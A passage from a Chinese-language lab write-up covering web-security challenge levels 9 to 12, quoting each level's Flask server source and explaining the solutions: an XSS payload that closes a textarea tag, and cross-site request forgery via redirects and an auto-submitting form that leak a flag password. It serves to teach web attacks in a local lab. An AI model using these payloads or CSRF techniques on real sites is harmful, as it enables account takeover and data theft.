punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>alert_is_present<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> TimeoutException<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"Failed to alert\n"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>    <span class="token keyword">return</span> <span class="token string">"Not Found\n"</span><span class="token punctuation">,</span> <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="leve9"><a href="#leve9" class="headerlink" title="leve9"></a>leve9</h2><p>这一次跟之前是一样的，唯一不同的是，echo的内容被<code>&lt;textarea&gt;</code>标签给括起来了。我们可以选择闭合这个<code>textarea标签</code></p><p><code>&lt;/textarea&gt;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;This is an alert&#39;);&lt;/script&gt;&lt;textarea&gt;</code><br>源码:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/echo"</span><span class="token punctuation">:</span>        echo <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> echo<span class="token punctuation">,</span> <span class="token string">"Missing `echo` argument"</span>        <span class="token keyword">return</span> html<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"&lt;textarea></span><span class="token interpolation"><span class="token punctuation">&#123;</span>echo<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/textarea>"</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/visit"</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> url<span class="token punctuation">,</span> <span class="token string">"Missing `url` argument"</span>        url_arg_parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">assert</span> url_arg_parsed<span class="token punctuation">.</span>hostname <span class="token operator">==</span> challenge_host<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Invalid `url`, hostname should be `</span><span class="token interpolation"><span class="token punctuation">&#123;</span>challenge_host<span class="token punctuation">&#125;</span></span><span class="token string">`"</span></span>        <span class="token keyword">with</span> run_browser<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> browser<span class="token punctuation">:</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>alert_is_present<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> TimeoutException<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"Failed to alert\n"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>    <span class="token keyword">return</span> <span class="token string">"Not Found\n"</span><span class="token punctuation">,</span> <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><ol><li>访问 <a href="http://challenge.localhost/visit?url=http://challenge.localhost/leak,%E8%AE%A9%E5%AE%83%E8%87%AA%E5%B7%B1%E7%99%BB%E5%BD%95%EF%BC%8C%E5%90%8C%E6%97%B6%E8%AE%BE%E7%BD%AEleak=Ture">http://challenge.localhost/visit?url=http://challenge.localhost/leak,让它自己登录，同时设置leak=Ture</a></li><li>访问 <a href="http://challenge.localhost/info?user=1%EF%BC%8C">http://challenge.localhost/info?user=1，</a> 由于leak是更改的数据库，所以这里依旧保持。至于user的值，我是随便尝试的。</li></ol><p>本来我是想着利用，echo将rowid显示出来，但是不知道怎么做。</p><p><code>&lt;script type=&quot;text/javascript&quot;&gt;alter(sessionData = &#123;session_data&#125;)&lt;/script&gt;</code><br>源码:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level10</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS users AS "</span>                <span class="token string">'SELECT "flag" AS username, ? as password, ? as leak'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>            username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>            password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span> username<span class="token punctuation">,</span> <span class="token string">"Missing `username` form"</span>            <span class="token keyword">assert</span> password<span class="token punctuation">,</span> <span class="token string">"Missing `password` form"</span>            user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SELECT rowid, * FROM users WHERE username = ? AND password = ?"</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `username` or `password`"</span>            session<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"rowid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span>        <span class="token keyword">return</span> form<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/leak"</span><span class="token punctuation">:</span>        user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Not logged in"</span>        db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"UPDATE users SET leak = TRUE WHERE rowid = ?"</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"Leaked\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/info"</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token string">"user"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">,</span> <span class="token string">"Missing `user` argument"</span>        user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `user`"</span>        info <span class="token operator">=</span> <span class="token punctuation">[</span>user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">"leak"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            info<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>info<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/visit"</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> url<span class="token punctuation">,</span> <span class="token string">"Missing `url` argument"</span>        url_arg_parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">assert</span> url_arg_parsed<span class="token punctuation">.</span>hostname <span class="token operator">==</span> challenge_host<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Invalid `url`, hostname should be `</span><span class="token interpolation"><span class="token punctuation">&#123;</span>challenge_host<span class="token punctuation">&#125;</span></span><span class="token string">`"</span></span>        <span class="token keyword">with</span> run_browser<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> browser<span class="token punctuation">:</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>challenge_host<span class="token punctuation">&#125;</span></span><span class="token string">/login"</span></span><span class="token punctuation">)</span>            user_form <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> flag<span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> name<span class="token punctuation">,</span> value <span class="token keyword">in</span> user_form<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                field <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>NAME<span class="token punctuation">,</span> name<span class="token punctuation">)</span>                field<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>value<span class="token punctuation">)</span>            submit_field <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">)</span>            submit_field<span class="token punctuation">.</span>submit<span class="token punctuation">(</span><span class="token punctuation">)</span>            WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>staleness_of<span class="token punctuation">(</span>submit_field<span class="token punctuation">)</span><span class="token punctuation">)</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"Visited\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/echo"</span><span class="token punctuation">:</span>        echo <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> echo<span class="token punctuation">,</span> <span class="token string">"Missing `echo` argument"</span>        <span class="token keyword">return</span> html<span class="token punctuation">(</span>echo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Not Found\n"</span><span class="token punctuation">,</span> <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>这一关跟上一关的区别，跨站url的主机名设置为了<code>hacker.loaclhost</code>，而这个域名是不提供服务的。那我们需要启动一个hacker服务器，让它运行在<code>hacker.localhost</code>上。在访问challenge的visit时，将url设置为<code>hacker.localhost:81</code>,在hacker服务器，将这个请求重定向到challenge服务器的leak路由即可。</p><p>这里需要注意的是，为什么我在hacker服务端，重新发送请求到challenge的leak端口不行，但是重定向到leak就可以。</p><p>原因如下：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Flask 重定向处理：Flask 的 redirect 函数是 HTTP 协议中的一个特性，它向浏览器发送一个 302 响应码，并告诉浏览器去访问另一个 URL。这和直接在服务器端发送一个请求是有区别的。使用 redirect 是让客户端（如浏览器）去访问新的 URL，而不是服务器端发起请求。直接请求和重定向的区别：如果你直接在服务器端重新发送请求，需要使用 requests 库来实现，而不是使用 Flask 的 redirect 函数。重定向是让浏览器去访问新的 URL，而直接请求则是服务器端自己去访问 URL 并处理响应。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如果是服务端重新请求，那么因为跨域的问题，session无法保留。但是如果是浏览器访问新的URL，那么以前登录的session将可以使用。这样访问leak的时候，不会显示没有登录的报错了。</strong></p><p>源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level11</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS users AS "</span>                <span class="token string">'SELECT "flag" AS username, ? as password, ? as leak'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>            username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>            password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span> username<span class="token punctuation">,</span> <span class="token string">"Missing `username` form"</span>            <span class="token keyword">assert</span> password<span class="token punctuation">,</span> <span class="token string">"Missing `password` form"</span>            user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SELECT rowid, * FROM users WHERE username = ? AND password = ?"</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `username` or `password`"</span>            session<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"rowid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span>        <span class="token keyword">return</span> form<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/leak"</span><span class="token punctuation">:</span>        user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Not logged in"</span>        db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"UPDATE users SET leak = TRUE WHERE rowid = ?"</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"Leaked\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/info"</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token string">"user"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">,</span> <span class="token string">"Missing `user` argument"</span>        user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `user`"</span>        info <span class="token operator">=</span> <span class="token punctuation">[</span>user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">"leak"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            info<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>info<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/visit"</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> url<span class="token punctuation">,</span> <span class="token string">"Missing `url` argument"</span>        url_arg_parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">assert</span> url_arg_parsed<span class="token punctuation">.</span>hostname <span class="token operator">==</span> hacker_host<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Invalid `url`, hostname should be `</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hacker_host<span class="token punctuation">&#125;</span></span><span class="token string">`"</span></span>        <span class="token keyword">with</span> run_browser<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> browser<span class="token punctuation">:</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>challenge_host<span class="token punctuation">&#125;</span></span><span class="token string">/login"</span></span><span class="token punctuation">)</span>            user_form <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> flag<span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> name<span class="token punctuation">,</span> value <span class="token keyword">in</span> user_form<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                field <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>NAME<span class="token punctuation">,</span> name<span class="token punctuation">)</span>                field<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>value<span class="token punctuation">)</span>            submit_field <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">)</span>            submit_field<span class="token punctuation">.</span>submit<span class="token punctuation">(</span><span class="token punctuation">)</span>            WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>staleness_of<span class="token punctuation">(</span>submit_field<span class="token punctuation">)</span><span class="token punctuation">)</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"Visited\n"</span>    <span class="token keyword">return</span> <span class="token string">"Not Found\n"</span><span class="token punctuation">,</span> <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>这一关于与上一关的区别是，在请求leak的时候，方法必须是POST方法。所以简单的重定向无法正确请求leak，简单重定向的请求方法是<code>GET</code>。</p><p>所以，我们选择在hacker服务器上增加一个网页，在访问challenge.localhost的visit路由时，先访问这个网页，然后由这个网页处理重定向，再将网页重定向到challenge.localhost的leak路由下。但是这里有一个问题，如果你直接使用JS代码中的fetch处理重定向请求，会出现跨域的问题。</p><p>解决的方案就是，设置一个表单，在网页加载完成之后，自动提交这个表单。这样的话不会出现跨域的问题</p><p>源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level12</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS users AS "</span>                <span class="token string">'SELECT "flag" AS username, ? as password, ? as leak'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>            username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>            password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span> username<span class="token punctuation">,</span> <span class="token string">"Missing `username` form"</span>            <span class="token keyword">assert</span> password<span class="token punctuation">,</span> <span class="token string">"Missing `password` form"</span>            user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SELECT rowid, * FROM users WHERE username = ? AND password = ?"</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `username` or `password`"</span>            session<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"rowid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span>        <span class="token keyword">return</span> form<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/leak"</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> user<span class="token 